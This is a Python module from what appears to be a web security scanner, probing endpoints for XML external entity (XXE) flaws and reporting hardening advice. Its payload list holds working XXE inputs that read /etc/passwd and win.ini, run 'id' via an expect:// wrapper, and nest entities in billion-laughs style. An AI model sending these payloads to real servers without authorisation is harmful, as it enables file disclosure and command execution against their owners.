"""Best-effort XXE probing (non-destructive).

This sends a few XML payloads to common endpoints and inspects responses for
parser errors or external entity resolution hints.

Note: True XXE confirmation often requires out-of-band interaction; this check
limits itself to safe indicators.
"""

from __future__ import annotations

from urllib.parse import urljoin

from ..core.base_check import BaseCheck
from ..core.utils import http_request, normalize_target, requests_session, safe_truncate


XML_PAYLOADS = [
    (
        "basic_entity",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe "xxe_test"> ]>\n<foo>&xxe;</foo>\n""",
    ),
    (
        "external_entity_file",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<foo>&xxe;</foo>\n""",
    ),
    (
        "external_entity_windows",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>\n<foo>&xxe;</foo>\n""",
    ),
    (
        "parameter_entity",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>\n<foo>test</foo>\n""",
    ),
    (
        "billion_laughs",
        """<?xml version="1.0"?>\n<!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ENTITY lol2 "&lol;&lol;"> <!ENTITY lol3 "&lol2;&lol2;"> ]>\n<lolz>&lol3;</lolz>\n""",
    ),
    (
        "utf7_bypass",
        """<?xml version="1.0" encoding="UTF-7"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<foo>&xxe;</foo>\n""",
    ),
    (
        "soap_xxe",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n<soap:Body><foo>&xxe;</foo></soap:Body>\n</soap:Envelope>\n""",
    ),
    (
        "expect_wrapper",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>\n<foo>&xxe;</foo>\n""",
    ),
    (
        "php_wrapper",
        """<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>\n<foo>&xxe;</foo>\n""",
    ),
]

CANDIDATE_ENDPOINTS = [
    "/",
    "/api",
    "/api/xml",
    "/xml",
    "/soap",
    "/ws",
    "/rest",
    "/service",
    "/services",
    "/rpc",
    "/graphql",
    "/upload",
    "/import",
    "/parse",
]


class XXEProbing(BaseCheck):
    scan_type = "A02_XXE_Probing"

    def run(self, target: str):
        res = self._result(target)
        base = normalize_target(target)
        s = requests_session(self.config.user_agent)

        indicators = []
        raw = []
        for ep in CANDIDATE_ENDPOINTS[:10]:
            url = urljoin(base.rstrip("/") + "/", ep.lstrip("/"))
            for name, payload in XML_PAYLOADS:
                try:
                    r = http_request(
                        s,
                        "POST",
                        url,
                        timeout=(self.config.connect_timeout, self.config.read_timeout),
                        max_redirects=self.config.max_redirects,
                        data=payload.encode("utf-8"),
                        headers={"Content-Type": "application/xml"},
                    )
                    body = (r.text or "")[:30000].lower()
                    raw.append(f"POST {url} [{name}] => {r.status_code}")

                    # Heuristics: XML parser error messages can indicate XML parsing is enabled
                    if any(
                        s in body
                        for s in [
                            "doctype",
                            "entity",
                            "xml parse",
                            "parsererror",
                            "saxparseexception",
                        ]
                    ) and r.status_code >= 400:
                        indicators.append(f"{url} ({name}) shows XML parser errors")

                    # Very weak signal: reflection of xxe_test
                    if "xxe_test" in body:
                        indicators.append(f"{url} ({name}) reflected entity content")
                except Exception as e:
                    raw.append(f"POST {url} [{name}] error: {type(e).__name__}: {e}")

        if indicators:
            res.severity = "MEDIUM"
            res.confidence = "low"
            res.add_finding(
                title="XXE indicators detected (best-effort)",
                severity="MEDIUM",
                confidence="low",
                risk="Possible insecure XML parser configuration (external entities/DTDs).",
                evidence=safe_truncate("\n".join(indicators), 6000),
                recommendation="Disable DTD/external entities, use hardened XML parsers, and validate XML inputs.",
                confidence_reason="Best-effort heuristic indicators only (no out-of-band confirmation). Manual validation recommended.",
            )
            res.metadata["xxe_indicators"] = indicators

        res.evidence = safe_truncate("\n".join(raw), 10000)
        res.metadata["base_url"] = base
        return res
